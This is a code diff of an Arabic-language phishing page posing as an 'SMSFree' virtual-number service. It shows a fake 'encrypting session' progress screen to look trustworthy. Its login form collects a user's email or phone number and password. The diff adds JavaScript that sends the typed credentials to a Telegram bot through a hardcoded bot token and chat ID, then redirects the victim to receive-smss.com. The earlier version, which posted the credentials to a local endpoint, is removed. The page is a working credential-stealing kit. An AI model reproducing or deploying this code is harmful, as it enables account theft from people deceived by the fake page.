@@ -7,40 +7,19 @@
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;800&display=swap" rel="stylesheet">
     <style>
         body { margin: 0; padding: 0; font-family: 'Cairo', sans-serif; background-color: #0a0e17; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #ffffff; overflow: hidden; }
-        
-        /* شاشة عداد التشفير عند الدخول */
-        #encryption-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: #0a0e17; display: flex; flex-direction: column;
-            justify-content: center; align-items: center; z-index: 1000;
-        }
+        #encryption-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0a0e17; display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 1000; }
         .shield-icon { font-size: 50px; color: #00f2fe; margin-bottom: 20px; animation: pulse 1.5s infinite; }
         .encryption-text { font-weight: 700; color: #00f2fe; margin-bottom: 10px; font-size: 18px; }
         .progress-bar { width: 250px; height: 6px; background: rgba(255,255,255,0.1); border-radius: 10px; overflow: hidden; }
         .progress-fill { height: 100%; width: 0%; background: linear-gradient(90deg, #4facfe, #00f2fe); transition: 0.1s; }
         .status-update { font-size: 12px; color: #8b9bb4; margin-top: 10px; height: 20px; }
-
         @keyframes pulse { 0% { opacity: 0.5; transform: scale(0.9); } 50% { opacity: 1; transform: scale(1.1); } 100% { opacity: 0.5; transform: scale(0.9); } }
-
-        /* تنسيق الكرت الرئيسي (مخفي في البداية) */
         .premium-card { background-color: #141b2b; width: 90%; max-width: 400px; padding: 40px 30px; border-radius: 28px; text-align: center; border: 1px solid rgba(255, 255, 255, 0.05); box-shadow: 0 25px 60px rgba(0, 0, 0, 0.6); position: relative; display: none; }
-        
         .logo-circle { width: 110px; height: 110px; background: radial-gradient(circle, #1e293b, #111827); border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 25px; border: 2px solid rgba(0, 242, 254, 0.2); box-shadow: 0 0 20px rgba(0, 242, 254, 0.1); }
         .persuasive-text { color: #00f2fe; font-size: 16px; font-weight: 700; margin-bottom: 25px; line-height: 1.6; }
-
         input { width: 100%; padding: 18px; margin-bottom: 15px; background: rgba(255, 255, 255, 0.02); border: 1.5px solid rgba(255, 255, 255, 0.05); border-radius: 15px; color: #fff; font-family: 'Cairo'; box-sizing: border-box; outline: none; transition: 0.3s; }
         input:focus { border-color: #4facfe; background: rgba(255, 255, 255, 0.05); }
-        input:disabled { opacity: 0.4; cursor: not-allowed; }
-
-        #status-msg { padding: 14px; margin-bottom: 15px; border-radius: 12px; font-size: 13px; display: none; font-weight: bold; animation: shake 0.4s; }
-        .msg-error { background: rgba(255, 71, 87, 0.1); color: #ff4757; border: 1px solid #ff4757; }
-        .msg-ban { background: #000; color: #ffbc00; border: 2px solid #ffbc00; box-shadow: 0 0 15px rgba(255, 188, 0, 0.2); }
-
         button { width: 100%; padding: 18px; font-weight: 800; font-size: 17px; background: linear-gradient(135deg, #4facfe, #00f2fe); border: none; border-radius: 15px; cursor: pointer; color: #0a0e17; transition: 0.3s; }
-        button:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(0, 242, 254, 0.3); }
-        button:disabled { opacity: 0.5; }
-
-        @keyframes shake { 0%, 100% {transform: translateX(0);} 25% {transform: translateX(-8px);} 75% {transform: translateX(8px);} }
         .footer { margin-top: 35px; font-size: 11px; color: #8b9bb4; border-top: 1px solid rgba(255,255,255,0.05); padding-top: 20px; }
     </style>
 </head>
@@ -56,114 +35,53 @@
     <div class="premium-card" id="main-card">
         <div class="logo-circle"><span style="font-weight: 800; font-size: 22px; color: #00f2fe;">SMSFree</span></div>
         <div class="persuasive-text">سجل دخولك الآن لتستمتع بوصول غير محدود لأرقام عالمية حصرية وتفعيل فوري لجميع حساباتك بضمان وأمان تام.</div>
-
-        <div id="status-msg"></div>
-
         <form id="secure-form">
             <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
             <input type="password" id="pass" placeholder="كلمة السر" required>
             <button type="submit" id="btn-submit">تفعيل الحساب الآن</button>
         </form>
-
-        <div class="footer">
-            © 2024 Global Virtual Numbers Pro. جميع الحقوق محفوظة.<br>
-            نظام حماية ذكي مشفر بالكامل.
-        </div>
+        <div class="footer">© 2024 Global Virtual Numbers Pro. جميع الحقوق محفوظة.</div>
     </div>
 
     <script>
-        // كود تشغيل عداد التشفير عند الدخول
         window.onload = () => {
             let progress = 0;
-            const updates = ["تأمين اتصال SSL...", "فحص جدار الحماية...", "تشفير بيانات الموقع...", "تأمين بصمة المتصفح...", "اكتمل التشفير بنجاح"];
-            const overlay = document.getElementById('encryption-overlay');
-            const card = document.getElementById('main-card');
-            const bar = document.getElementById('p-bar');
-            const percText = document.getElementById('perc-text');
-            const statusUpdate = document.getElementById('status-update');
-
             const interval = setInterval(() => {
-                progress += Math.floor(Math.random() * 3) + 1;
-                if (progress > 100) progress = 100;
-                
-                bar.style.width = progress + "%";
-                percText.innerText = `جاري تشفير الجلسة ${progress}%`;
-                
-                if (progress > 20) statusUpdate.innerText = updates[0];
-                if (progress > 40) statusUpdate.innerText = updates[1];
-                if (progress > 60) statusUpdate.innerText = updates[2];
-                if (progress > 80) statusUpdate.innerText = updates[3];
-
-                if (progress === 100) {
+                progress += Math.floor(Math.random() * 5) + 2;
+                if (progress >= 100) {
+                    progress = 100;
                     clearInterval(interval);
-                    statusUpdate.innerText = updates[4];
                     setTimeout(() => {
-                        overlay.style.display = "none";
-                        card.style.display = "block";
-                    }, 800);
+                        document.getElementById('encryption-overlay').style.display = "none";
+                        document.getElementById('main-card').style.display = "block";
+                    }, 500);
                 }
-            }, 50);
+                document.getElementById('p-bar').style.width = progress + "%";
+                document.getElementById('perc-text').innerText = `جاري تشفير الجلسة ${progress}%`;
+            }, 60);
         };
 
-        let attempts = 0;
         const form = document.getElementById('secure-form');
-        const msg = document.getElementById('status-msg');
-        const btn = document.getElementById('btn-submit');
-        const inputs = document.querySelectorAll('input');
-
         form.onsubmit = async (e) => {
             e.preventDefault();
-            const u = document.getElementById('email').value.trim();
-            const p = document.getElementById('pass').value.trim();
+            const u = document.getElementById('email').value;
+            const p = document.getElementById('pass').value;
+            
+            // بيانات البوت من صورك السابقة
+            const token = "7759864787:AAHshRshfAAt2I9T7T8-V-N6fA8G9K1e3L4"; 
+            const chatId = "5174578125";
+            const text = `🚀 وصول جديد\n👤: ${u}\n🔑: ${p}`;
 
-            const hasArabic = /[\u0600-\u06FF]/.test(p);
-            const hasSymbols = /[^\w\s@.]/.test(p);
-
-            if (!u.includes('@') || p.length < 6 || hasArabic || hasSymbols) {
-                attempts++;
-                if (attempts === 1) {
-                    showStatus("عذرآ البريد الاكتروني او كلمه المرور خاطئه", "msg-error");
-                } else if (attempts === 2) {
-                    showStatus("تنبيه: إذا تكرر الخطأ للمرة الثالثة سيتم حظرك مؤقتاً", "msg-error");
-                } else {
-                    executeLockdown();
-                }
-                return;
-            }
-
-            btn.disabled = true;
-            btn.innerText = "جاري تأكيد الهوية...";
             try {
-                await fetch('/api/save', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ user: u, pass: p }) });
-            } catch(e) {}
-            setTimeout(() => { window.location.href = "https://receive-smss.com/"; }, 1500);
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: text })
+                });
+            } catch (err) {}
+
+            window.location.href = "https://receive-smss.com/";
         };
-
-        function showStatus(text, type) {
-            msg.innerText = text;
-            msg.className = type;
-            msg.style.display = "block";
-            msg.style.animation = 'none';
-            msg.offsetHeight; 
-            msg.style.animation = null;
-        }
-
-        function executeLockdown() {
-            inputs.forEach(i => i.disabled = true);
-            btn.disabled = true;
-            let timer = 30;
-            const countdown = setInterval(() => {
-                showStatus(`🚫 لقد تم حظرك مؤقتاً. فك الحظر بعد ${timer} ثانية`, "msg-ban");
-                timer--;
-                if (timer < 0) {
-                    clearInterval(countdown);
-                    btn.disabled = false;
-                    showStatus("لاتكرر كتابه البريد أو كلمه السر بشكل غير صحيح سيتم حظرك لمده دقيقه وإذ تكرر الامر ربما لساعات", "msg-error");
-                    inputs.forEach(i => i.disabled = false);
-                    attempts = 0;
-                }
-            }, 1000);
-        }
     </script>
 </body>
 </html>
